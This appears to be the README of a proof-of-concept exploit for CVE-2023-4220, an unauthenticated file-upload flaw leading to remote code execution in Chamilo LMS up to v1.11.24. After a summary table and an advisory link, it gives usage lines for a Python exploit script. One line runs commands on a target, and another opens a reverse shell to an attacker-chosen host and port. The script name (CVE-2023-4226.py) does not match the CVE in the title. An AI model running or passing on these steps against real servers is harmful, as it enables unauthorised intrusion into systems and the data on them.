# CVE-2023-4220 POC

More about CVE-2023-4220: [StarLabs Advisory](https://starlabs.sg/advisories/23/23-4220/)

## Summary

| **Product**              | Chamilo                                                                                                                                                                                                                                                                                     |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Vendor**               | Chamilo                                                                                                                                                                                                                                                                                     |
| **Severity**             | High - Adversaries may exploit software vulnerabilities to obtain unauthenticated remote code execution.                                                                                                                                                                                    |
| **Affected Versions**    | <= v1.11.24                                                                                                                                                                                                                                                                                 |
| **Tested Versions**      | v1.11.24 (latest version as of writing)                                                                                                                                                                                                                                                     |
| **CVE Identifier**       | CVE-2023-4220                                                                                                                                                                                                                                                                               |
| **CVE Description**      | Unrestricted file upload in big file upload functionality in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php` in Chamilo LMS <= v1.11.24 allows unauthenticated attackers to perform stored cross-site scripting attacks and obtain remote code execution via uploading of web shell. |
| **CWE Classification**   | CWE-434: Unrestricted Upload of File with Dangerous Type                                                                                                                                                                                                                                    |
| **CAPEC Classification** | CAPEC-650: Upload a Web Shell to a Web Server                                                                                                                                                                                                                                               |

## Proof of Concept (PoC)

### Execute Commands Directly

To execute commands directly, use the following command:

`python CVE-2023-4226.py -u http://<target_ip>:<target_port> -c whoami`

### Obtain a Reverse Shell

To obtain a reverse shell, use the following command:

`python CVE-2023-4226.py -u http://<target_ip>:<target_port> -lhost <local_ip> -lport <local_port>`
